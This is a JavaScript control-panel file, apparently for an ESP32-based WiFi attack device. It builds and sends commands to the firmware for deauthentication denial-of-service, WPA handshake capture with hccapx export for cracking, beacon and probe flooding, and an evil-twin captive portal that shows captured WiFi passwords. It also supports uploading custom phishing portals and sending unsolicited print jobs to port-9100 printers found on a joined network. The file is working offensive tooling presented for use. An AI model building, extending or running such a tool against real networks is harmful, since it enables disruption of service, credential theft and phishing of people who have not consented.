            var ch      = byteArray[offset + 32];
            apSsidMap[i] = ssid || ("AP #" + i);

            var rssiClass = rssi >= -60 ? "sig-strong" : rssi >= -75 ? "sig-ok" : "sig-weak";
            var tr = document.createElement("tr");
            tr.id  = String(i);
            tr.setAttribute("onclick", "selectAp(this)");
            tr.innerHTML =
            '<td class="td-ssid">' + escapeHtml(apSsidMap[i]) + '</td>' +
            '<td class="td-bssid"><code>' + bssid + '</code></td>' +
            '<td class="td-rssi"><span class="' + rssiClass + '">' + rssi + ' dBm</span></td>';
            tbody.appendChild(tr);
        }
    };

    oReq.onerror   = function () { tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg err">' + escapeHtml(t("scan.failed")) + '</td></tr>'; };
    oReq.ontimeout = function () { tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg err">' + escapeHtml(t("scan.timedOut")) + '</td></tr>'; };

    oReq.open("GET", "http://192.168.4.1/ap-list", true);
    oReq.send();
}

/* ── AP Selection ────────────────────────────────── */
function getMaxTargets() {
    var attackType   = parseInt(document.getElementById("attack_type").value);
    var attackMethod = parseInt(document.getElementById("attack_method").value);
    if (isNaN(attackType)) return 16;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE) return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_DOS) {
        /* Normal Deauth (1) and Targeted Clients (4) support multiple APs */
        if (!isNaN(attackMethod) && (attackMethod === 1 || attackMethod === 4)) return 16;
        return 1;
    }
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_PROBE)       return 0;
    return 1;
}

function selectAp(el) {
    var id  = parseInt(el.id);
    var max = getMaxTargets();
    if (max === 0) return;
    var idx = selectedApElements.indexOf(id);
    if (idx > -1) {
        selectedApElements.splice(idx, 1);
        el.classList.remove("selected");
    } else {
        if (selectedApElements.length >= max) {
            var prevId  = selectedApElements[0];
            var prevRow = document.getElementById(String(prevId));
            if (prevRow) prevRow.classList.remove("selected");
            selectedApElements = [];
        }
        selectedApElements.push(id);
        el.classList.add("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function deselectAp(id) {
    var idx = selectedApElements.indexOf(id);
    if (idx > -1) {
        selectedApElements.splice(idx, 1);
        var row = document.getElementById(String(id));
        if (row) row.classList.remove("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function enforceSelectionLimit() {
    var max = getMaxTargets();
    while (selectedApElements.length > max && max >= 0) {
        var removedId  = selectedApElements.pop();
        var removedRow = document.getElementById(String(removedId));
        if (removedRow) removedRow.classList.remove("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function updateSelectedChips() {
    var container = document.getElementById("selected-ap-chips");
    if (!container) return;
    if (selectedApElements.length === 0) {
        container.innerHTML = '<span class="no-ap-hint">' + escapeHtml(t("targets.noApJs")) + '</span>';
        return;
    }
    container.innerHTML = "";
    selectedApElements.forEach(function (id) {
        var ssid = escapeHtml(apSsidMap[id] || ("AP #" + id));
        var chip = document.createElement("span");
        chip.className = "ap-chip";
        chip.innerHTML = ssid + '<span class="chip-x" onclick="deselectAp(' + id + ')">✕</span>';
        container.appendChild(chip);
    });
}

function updateSelectedCountBadge() {
    var n = selectedApElements.length;
    var label = t("badge.selected", n);
    var badge = document.getElementById("selected-count-badge");
    if (badge) badge.textContent = label;
    var badge2 = document.getElementById("selected-count-badge-attack");
    if (badge2) badge2.textContent = label;
}

/* ── Attack Type Selection ───────────────────────── */
function selectAttackType(type, btn) {
    document.querySelectorAll('.type-btn').forEach(function (b) { b.classList.remove('active'); });
    btn.classList.add('active');
    document.getElementById('attack_type').value = type;
    updateConfigurableFields({ value: type });
}

function resetMethodSelect() {
    var sel = document.getElementById("attack_method");
    if (!sel) return;
    sel.innerHTML = "";
    var opt = document.createElement("option");
    opt.value = "";
    opt.selected = true;
    opt.disabled = true;
    opt.hidden = true;
    opt.text = t("cfg.selectTypeFirst");
    sel.appendChild(opt);
    sel.setAttribute("disabled", "disabled");
}

function updateConfigurableFields(el) {
    resetMethodSelect();
    var beaconCfg     = document.getElementById("beacon_config");
    var methodRow     = document.getElementById("method-row");
    var timeoutRow    = document.getElementById("timeout-row");
    var noTimeoutNote = document.getElementById("no-timeout-note");
    var intensityRow  = document.getElementById("intensity-row");

    beaconCfg.style.display = "none";
    if (methodRow)     methodRow.style.display    = "block";
    if (timeoutRow)    timeoutRow.style.display   = "block";
    if (noTimeoutNote) noTimeoutNote.style.display = "none";
    if (intensityRow)  intensityRow.style.display = "none";

    var type = parseInt(el.value);

    if (NO_TIMEOUT_TYPES.indexOf(type) !== -1) {
        if (timeoutRow) timeoutRow.style.display = "none";
    }

    switch (type) {
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
            setAttackMethods(methodItems(AttackTypeEnum.ATTACK_TYPE_HANDSHAKE));
            break;
        case AttackTypeEnum.ATTACK_TYPE_DOS:
            document.getElementById("attack_timeout").value = 2;
            if (noTimeoutNote) noTimeoutNote.style.display = "block";
            setAttackMethods(methodItems(AttackTypeEnum.ATTACK_TYPE_DOS));
            if (intensityRow) intensityRow.style.display = "block";
        break;

        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
            document.getElementById("attack_timeout").value = 5;
            setAttackMethods(methodItems(AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM));
            beaconCfg.style.display = "block";
            break;

        case AttackTypeEnum.ATTACK_TYPE_PROBE:
            document.getElementById("attack_timeout").value = 5;
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
            if (methodRow) methodRow.style.display = "none";
            break;
    }
    enforceSelectionLimit();
}

function setAttackMethods(items) {
    var sel = document.getElementById("attack_method");
    sel.removeAttribute("disabled");
    while (sel.options.length > 0) sel.remove(0);
    items.forEach(function (item) {
        var opt   = document.createElement("option");
        opt.value = item.value;   /* firmware method id — stays stable even if items are removed */
        opt.text  = item.name;
        sel.appendChild(opt);
    });
    sel.selectedIndex = 0;
    enforceSelectionLimit();
}

/* ── Run Attack ──────────────────────────────────── */
function runAttack() {
    hideError();
    var attackType = parseInt(document.getElementById("attack_type").value);
    if (isNaN(attackType)) {
        showDialog(t("msg.selectTypeFirst"));
        return false;
    }

    var needsAp = (
        attackType !== AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_PROBE
    );

    if (needsAp && selectedApElements.length === 0) {
        showDialog(t("msg.selectTargetFirst"));
        return false;
    }

    var MAX_TARGETS = 16;

    var isNoTimeout    = NO_TIMEOUT_TYPES.indexOf(attackType) !== -1;
    var timeoutEnabled = isNoTimeout ? false : document.getElementById("timeout_enable").checked;
    var timeoutMin     = parseInt(document.getElementById("attack_timeout").value) || 1;
    var timeoutSec     = timeoutEnabled ? Math.min(65535, timeoutMin * 60) : 0;

    /* Beacon spam: byte 1 = count, byte 4 = mode (repurposed from ap_count)
     * All other attacks: byte 1 = method, byte 4 = ap count */
    var attackMethod = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? (parseInt(document.getElementById("beacon_count").value) || 20)
    : (parseInt(document.getElementById("attack_method").value) || 0);

    var beaconMode = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? (parseInt(document.getElementById("attack_method").value) || 0)
    : 0;

    var ids = selectedApElements.slice(0, MAX_TARGETS);

    /* Test intensity (1..50) — deauth frames per burst. Only meaningful for DoS,
     * but always sent so the 22-byte payload size stays fixed. */
    var intensityEl = document.getElementById("attack_intensity");
    var intensity   = intensityEl ? (parseInt(intensityEl.value) || 3) : 3;
    if (intensity < 1)  intensity = 1;
    if (intensity > 50) intensity = 50;

    /* Binary payload layout (22 bytes — must match attack_request_t):
     *   Byte 0    — attack type
     *   Byte 1    — attack method  OR  beacon count  (beacon spam)
     *   Byte 2-3  — timeout seconds, little-endian
     *   Byte 4    — ap count       OR  beacon mode   (beacon spam, repurposed)
     *   Byte 5-20 — AP index list  (unused for beacon spam)
     *   Byte 21   — test intensity (DoS)
     */
    var buf = new ArrayBuffer(6 + MAX_TARGETS);
    var arr = new Uint8Array(buf);

    arr[0] = attackType;
    arr[1] = attackMethod;
    arr[2] = timeoutSec & 0xFF;
    arr[3] = (timeoutSec >> 8) & 0xFF;
    arr[4] = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? beaconMode    /* mode goes here; C reads attack_request->ap_count as mode */
    : ids.length;
    ids.forEach(function (id, i) { arr[5 + i] = id; });
    arr[5 + MAX_TARGETS] = intensity;   /* byte 21 */

    currentAttackType = attackType;

    switchTab("attack");
    setRunningVisible(true);
    setResultVisible(false);

    var beaconWrap = document.getElementById("beacon-timer-wrap");
    var simpleWrap = document.getElementById("simple-running-wrap");
    var noTOHint   = document.getElementById("no-timeout-hint");
    var infoEl     = document.getElementById("running-attack-info");

    if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) {
        beaconWrap.style.display = "block";
        simpleWrap.style.display = "none";
        if (noTOHint) noTOHint.style.display = "none";
        attack_timeout = timeoutEnabled ? (timeoutMin * 60) : Infinity;
        time_elapsed   = 0;
        stopProgressTimer();
        running_poll = setInterval(countProgress, running_poll_interval);
        updateTimerDisplay();
    } else {
        beaconWrap.style.display = "none";
        simpleWrap.style.display = "block";
        stopProgressTimer();
        var disconnects = DISCONNECTS_MGMT_AP.indexOf(attackType) !== -1;
        if (noTOHint) {
            noTOHint.style.display = (disconnects && !timeoutEnabled && !isNoTimeout) ? "block" : "none";
        }
    }

    if (infoEl) infoEl.textContent = attackTypeName(attackType);

    var oReq = new XMLHttpRequest();
    oReq.open("POST", "http://192.168.4.1/run-attack", true);
    oReq.onload  = function () { setTimeout(getStatus, 500); };
    oReq.onerror = function () {
        if (attackType !== AttackTypeEnum.ATTACK_TYPE_DOS        &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_HANDSHAKE  &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN) {
            showError(t("err.cannotReach"));
            }
    };
    oReq.send(buf);

    return false;
}

/* ── Timer helpers ───────────────────────────────── */
function stopProgressTimer() {
    if (running_poll) { clearInterval(running_poll); running_poll = null; }
}

function countProgress() {
    if (attack_timeout !== Infinity && time_elapsed >= attack_timeout) {
        stopProgressTimer();
    }
    updateTimerDisplay();
    time_elapsed++;
}

function updateTimerDisplay() {
    var elEl = document.getElementById("timer-elapsed");
    var ofEl = document.getElementById("timer-of");
    var path = document.getElementById("timer-path");

    if (!elEl) return;
    elEl.textContent = formatTime(time_elapsed);

    if (attack_timeout === Infinity) {
        if (ofEl) ofEl.textContent = t("timer.noTimeout");
        if (path) path.setAttribute('stroke-dasharray', '100, 100');
    } else {
        if (ofEl) ofEl.textContent = "/ " + formatTime(attack_timeout);
        var progress = Math.min((time_elapsed / attack_timeout) * 100, 100);
        if (path) path.setAttribute('stroke-dasharray', progress + ', 100');
    }
}

function formatTime(sec) {
    if (sec === Infinity || isNaN(sec)) return "∞";
    var m = Math.floor(sec / 60);
    var s = sec % 60;
    return (m > 0 ? m + "m " : "") + s + "s";
}

/* ── Running / Result visibility ─────────────────── */
function setRunningVisible(v) {
    document.getElementById("running-section").style.display       = v ? "block" : "none";
    document.getElementById("attack-config-section").style.display = v ? "none"  : "block";
}

function setResultVisible(v) {
    document.getElementById("result-section").style.display  = v ? "block" : "none";
    document.getElementById("running-section").style.display = v ? "none"  : "block";
}

/* ── Show Result ─────────────────────────────────── */
function showResult(status, attack_type, content_size, content) {
    stopProgressTimer();
    document.getElementById("running-section").style.display = "none";
    document.getElementById("result-section").style.display  = "block";

    currentAttackType = attack_type;

    if (status === "TIMEOUT" &&
        (attack_type === AttackTypeEnum.ATTACK_TYPE_DOS ||
        attack_type === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE)) {
        status = "FINISHED";
        }

        var statusEl = document.getElementById("result-status");
    statusEl.textContent = (status === "FINISHED") ? t("status.finished") : t("status.timeout");
    statusEl.className   = "result-status " + (status === "FINISHED" ? "status-finished" : "status-timeout");

    document.getElementById("result-type").textContent = attackTypeName(attack_type);
    document.getElementById("result-body").innerHTML   = "";

    switch (attack_type) {
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
            renderHandshakeResult(content, content_size);
            break;
        case AttackTypeEnum.ATTACK_TYPE_DOS:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">' + escapeHtml(t("result.dos")) + '</p>';
        break;
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">' + escapeHtml(t("result.beacon")) + '</p>';
        break;
        case AttackTypeEnum.ATTACK_TYPE_PROBE:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">' + escapeHtml(t("result.probe")) + '</p>';
            break;
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
            fetchEvilTwinResult();
            break;
        default:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">' + escapeHtml(t("result.generic", attack_type)) + '</p>';
    }

    switchTab("attack");
}

/* ── Handshake result ────────────────────────────── */
function renderHandshakeResult(content, size) {
    var el = document.getElementById("result-body");
    if (!content || size < 4) {
        el.innerHTML =
        '<p class="result-err">' + escapeHtml(t("hs.notCaptured")) + '</p>' +
        '<p class="result-desc">' + escapeHtml(t("hs.notCapturedDesc")) + '</p>';
        return;
    }
    var hs = "";
    for (var i = 0; i < size; i++) {
        hs += uint8ToHex(content[i]);
        if (i % 50 === 49) hs += "\n";
    }
    el.innerHTML =
    '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;">' +
    '<button type="button" class="btn-secondary" onclick="crx3Download(\'/capture.pcap\',\'capture.pcap\')">' + escapeHtml(t("hs.downloadPcap")) + '</button>' +
    '<button type="button" class="btn-secondary" onclick="crx3Download(\'/capture.hccapx\',\'capture.hccapx\')">' + escapeHtml(t("hs.downloadHccapx")) + '</button>' +
    '</div>' +
    '<div class="result-block"><div class="result-block-label">' + escapeHtml(t("hs.rawLabel")) + '</div>' +
    '<pre><code id="hccapx-dump">' + hs + '</code></pre>' +
    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hccapx-dump\',this)">' + escapeHtml(t("common.copy")) + '</button>' +
    '</div>';
}

/* ── Evil Twin result ────────────────────────────── */
function fetchEvilTwinResult() {
    fetch('http://192.168.4.1/evil-twin-status')
    .then(function (r) { return r.json(); })
    .then(function (data) {
        var el = document.getElementById("result-body");
        if (data.status === "SUCCESS") {
            el.innerHTML =
            '<div class="evil-twin-password-box">' +
            '<div class="et-ok-icon">✓</div>' +
            '<div class="et-label">' + escapeHtml(t("et.captured")) + '</div>' +
            '<div class="et-password" id="et-password">' + escapeHtml(data.password) + '</div>' +
            (data.wrong_attempts > 0
            ? '<div class="et-attempts">' + escapeHtml(t("et.wrongBefore")) + ' <strong>' + data.wrong_attempts + '</strong></div>'
            : '') +
            '<button class="btn-secondary" style="margin-top:14px;" onclick="copyText(\'et-password\',this)">' + escapeHtml(t("et.copyPassword")) + '</button>' +
            '</div>';
        } else if (data.status === "RUNNING") {
            el.innerHTML =
            '<div style="text-align:center;padding:20px 0;">' +
            '<div class="spinner"></div>' +
            '<p class="result-desc">' + escapeHtml(t("et.running")) + '</p>' +
            '<p style="color:var(--acc-warn);margin-top:8px;font-size:0.85rem;">' + escapeHtml(t("et.wrongAttempts")) + ' <strong>' + data.wrong_attempts + '</strong></p>' +
            '</div>';
            setTimeout(fetchEvilTwinResult, 2000);
        } else {
            el.innerHTML =
            '<p class="result-err">' + escapeHtml(t("et.stopped")) + '</p>' +
            '<p class="result-desc">' + escapeHtml(t("et.wrongAttempts")) + ' ' + data.wrong_attempts + '</p>';
        }
    })
    .catch(function () {
        document.getElementById("result-body").innerHTML =
        '<p class="result-err">' + escapeHtml(t("et.fetchFail")) + '</p>';
    });
}

/* ── Reset attack ────────────────────────────────── */
function resetAttack() {
    stopProgressTimer();
    document.getElementById("result-section").style.display        = "none";
    document.getElementById("running-section").style.display       = "none";
    document.getElementById("attack-config-section").style.display = "block";

    var oReq = new XMLHttpRequest();
    oReq.open("HEAD", "http://192.168.4.1/reset", true);
    oReq.send();
}

/* ── Stop attack (USB only) ──────────────────────── */
/* Actually aborts the running attack (per-type cleanup), unlike resetAttack()
 * above which only clears the displayed status. Possible now because control
 * goes over USB, not the AP the attack itself disconnects — the old WiFi UI
 * never had a live "stop" button; you either waited for a timeout or power
 * cycled the device. */
function stopAttack() {
    var btn  = document.getElementById("btn-stop-attack");
    var orig = btn ? btn.textContent : null;
    if (btn) { btn.disabled = true; btn.textContent = t("running.stopping"); }
    fetch('http://192.168.4.1/stop', { method: 'POST' })
    .then(function () { setTimeout(getStatus, 300); })
    .catch(function () { showError(t("running.stopFailed")); })
    .finally(function () { if (btn) { btn.disabled = false; btn.textContent = orig; } });
}

/* ── Status polling ──────────────────────────────── */
function getStatus() {
    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 5000;

    oReq.onload = function () {
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) return;
        var arr = new Uint8Array(buf);

        var attack_state = arr[0];
        var attack_type  = arr[1];
        var content_size = arr[2] | (arr[3] << 8);
        var content      = arr.slice(4);

        if (attack_state === AttackStateEnum.RUNNING) {
            showRunning(attack_type);
        } else if (attack_state === AttackStateEnum.FINISHED ||
            attack_state === AttackStateEnum.TIMEOUT) {
            var statusLabel = (attack_state === AttackStateEnum.TIMEOUT) ? "TIMEOUT" : "FINISHED";
        showResult(statusLabel, attack_type, content_size, content);
            }
    };

    oReq.onerror = function () { /* ESP32 may be running an attack that cuts the management AP */ };
    oReq.open("GET", "http://192.168.4.1/status", true);
    oReq.send();
}

function showRunning(attack_type) {
    setRunningVisible(true);
    setResultVisible(false);
    currentAttackType = attack_type;
    var infoEl     = document.getElementById("running-attack-info");
    var beaconWrap = document.getElementById("beacon-timer-wrap");
    var simpleWrap = document.getElementById("simple-running-wrap");

    if (infoEl) infoEl.textContent = attackTypeName(attack_type);

    if (beaconWrap) beaconWrap.style.display = (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) ? "block" : "none";
    if (simpleWrap) simpleWrap.style.display = (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) ? "none"  : "block";

    switchTab("attack");
}

/* ── Error helpers ───────────────────────────────── */
function showError(msg) {
    var el = document.getElementById("errors");
    el.textContent = msg;
    el.style.display = "block";
}

function hideError() {
    var el = document.getElementById("errors");
    el.style.display = "none";
}

/* ── Dialog ──────────────────────────────────────── */
function showDialog(msg) {
    document.getElementById("dialog-msg").textContent = msg;
    document.getElementById("dialog-overlay").classList.remove("hidden");
}

function closeDialog() {
    document.getElementById("dialog-overlay").classList.add("hidden");
}


/* ── Info popups ─────────────────────────────────── */
/* Reference list for each attack type, in the order of the buttons. */
function getAttackInfoList() {
    return ATTACK_ORDER.map(function (id) {
        var a = (L().attackTypes[id] || I18N[DEFAULT_LANG].attackTypes[id]);
        return { id: id, name: a.name, desc: a.desc };
    });
}

function buildInfoItem(name, desc, isCurrent) {
    var wrap = document.createElement("div");
    wrap.className = "info-item";
    var n = document.createElement("span");
    n.className = "info-name";
    n.textContent = name;
    if (isCurrent) {
        var tag = document.createElement("span");
        tag.className = "info-current-tag";
        tag.textContent = t("info.selectedTag");
        n.appendChild(tag);
    }
    var d = document.createElement("p");
    d.className = "info-desc";
    d.textContent = desc;
    wrap.appendChild(n);
    wrap.appendChild(d);
    return wrap;
}

function showInfo(title, items, currentName) {
    document.getElementById("info-title").textContent = title;
    var body = document.getElementById("info-body");
    body.innerHTML = "";
    items.forEach(function (it) {
        body.appendChild(buildInfoItem(it.name, it.desc, currentName != null && it.name === currentName));
    });
    document.getElementById("info-overlay").classList.remove("hidden");
}

function closeInfo() {
    document.getElementById("info-overlay").classList.add("hidden");
}

function showAttackTypeInfo() {
    var selected = parseInt(document.getElementById("attack_type").value);
    var list = getAttackInfoList();
    var currentName = null;
    list.forEach(function (a) { if (a.id === selected) currentName = a.name; });
    showInfo(t("info.attackTypesTitle"), list, currentName);
}

function showAttackMethodInfo() {
    var type = parseInt(document.getElementById("attack_type").value);
    if (isNaN(type)) {
        showInfo(t("info.methodTitle"), [{ name: t("info.noSel.name"), desc: t("info.noSel.desc") }], null);
        return;
    }
    var info = (L().methods[type] || I18N[DEFAULT_LANG].methods[type]);
    if (!info) {
        showInfo(t("info.methodTitle"), [{ name: t("info.noOpt.name"), desc: t("info.noOpt.desc") }], null);
        return;
    }
    var sel = document.getElementById("attack_method");
    var currentName = (sel && sel.selectedIndex >= 0 && !sel.options[sel.selectedIndex].disabled)
        ? sel.options[sel.selectedIndex].text : null;
    showInfo(info.title, info.items, currentName);
}


/* ═══════════════════════════════════════════════════════════════════════════
 *  Printer tab — port 9100 raw/PJL print
 * ═══════════════════════════════════════════════════════════════════════════ */
var PRN_BASE = "http://192.168.4.1";
var prn_conn_poll = null;
var prn_scan_poll = null;
var prn_job_poll  = null;

function loadPrinterNetworks() {
    var sel = document.getElementById("printer-network");
    if (!sel) return;
    sel.innerHTML = '<option value="">' + escapeHtml(t("prn.scanningNets")) + '</option>';

    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 15000;
    oReq.onload = function () {
        sel.innerHTML = "";
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) {
            sel.innerHTML = '<option value="">' + escapeHtml(t("scan.noAps")) + '</option>';
            return;
        }
        var byteArray = new Uint8Array(buf);
        var count = Math.floor(byteArray.byteLength / 40);
        if (count === 0) {
            sel.innerHTML = '<option value="">' + escapeHtml(t("scan.noAps")) + '</option>';
            return;
        }
        for (var i = 0; i < count; i++) {
            var offset = i * 40;
            var ssid = new TextDecoder("utf-8").decode(byteArray.subarray(offset, offset + 32)).replace(/\0/g, "").trim();
            var opt = document.createElement("option");
            opt.value = i;
            opt.textContent = ssid || ("AP #" + i);
            sel.appendChild(opt);
        }
    };
    oReq.onerror = function () { sel.innerHTML = '<option value="">' + escapeHtml(t("scan.failed")) + '</option>'; };
    oReq.ontimeout = function () { sel.innerHTML = '<option value="">' + escapeHtml(t("scan.timedOut")) + '</option>'; };
    oReq.open("GET", PRN_BASE + "/ap-list", true);
    oReq.send();
}

function printerConnect() {
    var sel = document.getElementById("printer-network");
    var pass = document.getElementById("printer-pass");
    var statusEl = document.getElementById("printer-conn-status");
    var scanBtn = document.getElementById("printer-scan-btn");

    if (!sel || sel.value === "") { showDialog(t("prn.noNetwork")); return; }
    var apIdx = sel.value;
    var pwd = pass ? pass.value : "";

    statusEl.textContent = t("prn.connConnecting");
    statusEl.className = "prn-status";
    if (scanBtn) scanBtn.disabled = true;

    var body = "ap=" + encodeURIComponent(apIdx) + "&pass=" + encodeURIComponent(pwd);

    fetch(PRN_BASE + "/printer/connect", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body
    })
    .then(function (r) {
        if (!r.ok) throw new Error("connect rejected");
        if (prn_conn_poll) clearInterval(prn_conn_poll);
        prn_conn_poll = setInterval(pollPrinterConn, 800);
    })
    .catch(function () {
        statusEl.textContent = t("prn.connFailed");
        statusEl.className = "prn-status err";
    });
}

function pollPrinterConn() {
    var statusEl = document.getElementById("printer-conn-status");
    var scanBtn = document.getElementById("printer-scan-btn");

    fetch(PRN_BASE + "/printer/status")
    .then(function (r) { return r.json(); })
    .then(function (d) {
        if (d.state === "connected") {
            statusEl.textContent = t("prn.connConnected") + " — " + d.ip + " (" + d.ssid + ")";
            statusEl.className = "prn-status ok";
            if (scanBtn) scanBtn.disabled = false;
            if (prn_conn_poll) { clearInterval(prn_conn_poll); prn_conn_poll = null; }
        } else if (d.state === "failed") {
            statusEl.textContent = t("prn.connFailed");
            statusEl.className = "prn-status err";
            if (prn_conn_poll) { clearInterval(prn_conn_poll); prn_conn_poll = null; }
        } else {
            statusEl.textContent = t("prn.connConnecting") + "…";
        }
    })
    .catch(function () {
        if (prn_conn_poll) { clearInterval(prn_conn_poll); prn_conn_poll = null; }
        statusEl.textContent = t("prn.connFailed");
        statusEl.className = "prn-status err";
    });
}

function printerScan() {
    var progressEl = document.getElementById("printer-scan-progress");
    var listEl = document.getElementById("printer-list");
    var scanBtn = document.getElementById("printer-scan-btn");

    if (scanBtn) scanBtn.disabled = true;
    listEl.innerHTML = "";
    progressEl.textContent = t("prn.scanning", 0);

    fetch(PRN_BASE + "/printer/scan", { method: "POST" })
    .then(function (r) {
        if (!r.ok) throw new Error("scan rejected");
        if (prn_scan_poll) clearInterval(prn_scan_poll);
        prn_scan_poll = setInterval(pollPrinterScan, 800);
    })
    .catch(function () {
        progressEl.textContent = t("prn.printFailed");
        progressEl.className = "prn-status err";
        if (scanBtn) scanBtn.disabled = false;
    });
}

function pollPrinterScan() {
    var progressEl = document.getElementById("printer-scan-progress");
    var listEl = document.getElementById("printer-list");
    var scanBtn = document.getElementById("printer-scan-btn");

    fetch(PRN_BASE + "/printer/scan-status")
    .then(function (r) { return r.json(); })
    .then(function (d) {
        if (d.state === "scanning") {
            progressEl.textContent = t("prn.scanning", d.progress);
        } else {
            if (prn_scan_poll) { clearInterval(prn_scan_poll); prn_scan_poll = null; }
            if (d.printers && d.printers.length > 0) {
                progressEl.textContent = t("prn.scanDone", d.printers.length);
                progressEl.className = "prn-status ok";
                listEl.innerHTML = "";
                d.printers.forEach(function (ip) {
                    var lbl = document.createElement("label");
                    lbl.className = "prn-check";
                    lbl.innerHTML = '<input type="checkbox" value="' + escapeHtml(ip) + '" checked> ' + escapeHtml(ip);
                    listEl.appendChild(lbl);
                });
            } else {
                progressEl.textContent = t("prn.scanNone");
                progressEl.className = "prn-status err";
            }
            if (scanBtn) scanBtn.disabled = false;
        }
    })
    .catch(function () {
        if (prn_scan_poll) { clearInterval(prn_scan_poll); prn_scan_poll = null; }
        progressEl.textContent = t("prn.printFailed");
        progressEl.className = "prn-status err";
        if (scanBtn) scanBtn.disabled = false;
    });
}

function printerPrint() {
    var statusEl = document.getElementById("printer-print-status");
    var textEl = document.getElementById("printer-text");
    var copiesEl = document.getElementById("printer-copies");

    var checks = document.querySelectorAll("#printer-list input[type=checkbox]:checked");
    if (checks.length === 0) { showDialog(t("prn.noTargets")); return; }
    var text = textEl ? textEl.value.trim() : "";
    if (text === "") { showDialog(t("prn.noText")); return; }
    var copies = copiesEl ? parseInt(copiesEl.value) || 1 : 1;
    var ips = [];
    checks.forEach(function (cb) { ips.push(cb.value); });

    statusEl.textContent = t("prn.printSending");
    statusEl.className = "prn-status";

    var body = "copies=" + encodeURIComponent(copies) +
               "&targets=" + encodeURIComponent(ips.join(",")) +
               "&text=" + encodeURIComponent(text);

    fetch(PRN_BASE + "/printer/print", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body
    })
    .then(function (r) {
        if (!r.ok) throw new Error("print rejected");
        if (prn_job_poll) clearInterval(prn_job_poll);
        prn_job_poll = setInterval(pollPrinterJob, 600);
    })
    .catch(function () {
        statusEl.textContent = t("prn.printFailed");
        statusEl.className = "prn-status err";
    });
}

function pollPrinterJob() {
    var statusEl = document.getElementById("printer-print-status");

    fetch(PRN_BASE + "/printer/job-status")
    .then(function (r) { return r.json(); })
    .then(function (d) {
        if (d.state === "printing") {
            statusEl.textContent = t("prn.printSending") + " (" + d.done + "/" + d.total + ")";
        } else {
            if (prn_job_poll) { clearInterval(prn_job_poll); prn_job_poll = null; }
            if (d.state === "done") {
                statusEl.textContent = t("prn.printDone", d.ok, d.total);
                statusEl.className = d.ok === d.total ? "prn-status ok" : "prn-status err";
            } else {
                statusEl.textContent = t("prn.printFailed");
                statusEl.className = "prn-status err";
            }
        }
    })
    .catch(function () {
        if (prn_job_poll) { clearInterval(prn_job_poll); prn_job_poll = null; }
        statusEl.textContent = t("prn.printFailed");
        statusEl.className = "prn-status err";
    });
}

/* ── Settings ────────────────────────────────────── */
function saveSettings() {
    var ssid = document.getElementById('ap-ssid').value.trim();
    var pass = document.getElementById('ap-pass').value;

    if (ssid.length < 1 || pass.length < 8) {
        showDialog(t("settings.errValidation"));
        return;
    }
    if (!confirm(t("settings.confirmRestart"))) return;

    fetch('/save_settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ssid=' + encodeURIComponent(ssid) + '&pass=' + encodeURIComponent(pass)
    })
    .then(function (response) {
        if (response.ok) showDialog(t("settings.saved"));
        else             showDialog(t("settings.saveFail"));
    })
    .catch(function () {
        showDialog(t("settings.netErr"));
    });
}

/* ── Custom Captive Portal ───────────────────────── */
var PORTAL_MAX_BYTES = 102400; /* 100 KB — deve casar com PORTAL_MAX_BYTES no firmware */

function loadPortalState() {
    var badge = document.getElementById("portal-state-badge");
    if (!badge) return;
    fetch('/devil_twin/portal-state')
    .then(function (r) { return r.json(); })
    .then(function (d) {
        badge.textContent = d.custom ? t("portal.custom") : t("portal.default");
    })
    .catch(function () { badge.textContent = t("portal.unknown"); });
}

function uploadPortal() {
    var input = document.getElementById("portal-file");
    if (!input || !input.files || input.files.length === 0) {
        showDialog(t("portal.chooseFirst"));
        return;
    }
    var file = input.files[0];
    if (file.size === 0) { showDialog(t("portal.empty")); return; }
    if (file.size > PORTAL_MAX_BYTES) {
        showDialog(t("portal.tooBig", Math.round(file.size / 1024)));
        return;
    }
    if (!confirm(t("portal.confirmReplace"))) return;

    var reader = new FileReader();
    reader.onload = function () {
        fetch('/devil_twin/upload', {
            method: 'POST',
